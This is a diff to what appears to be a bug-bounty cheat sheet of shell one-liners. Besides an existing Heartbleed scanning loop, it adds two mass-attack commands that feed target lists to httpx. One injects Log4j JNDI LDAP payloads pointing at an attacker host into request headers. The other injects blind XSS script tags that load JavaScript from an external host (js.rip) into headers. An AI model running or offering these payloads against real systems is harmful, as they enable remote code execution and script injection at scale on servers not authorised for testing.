@@ -63,3 +63,10 @@ order: 3
 
 ### Heartbleed vulnerability
 + `` cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done ``
+
+### Log4j via httpx 
++ `` cat targets.txt | httpx -H "X-Api-Version: \${jndi:ldap://<ip><port>}" -H "User-Agent: \${jndi:ldap://<ip><port>}" -H "Referer: \${jndi:ldap://<ip><port>}"``
+
+### mass blind xss
++ ``cat targets.txt| httpx -H "User-Agent: \"<script src=https://js.rip/0xmaruf></script>" -H "Host: \"<script src=https://js.rip/0xmaruf></script>" -H "Referer: \"<script src=https://js.rip/0xmaruf></script>" -H "Origin: \"<script src=https://js.rip/0xmaruf></script>"
+``
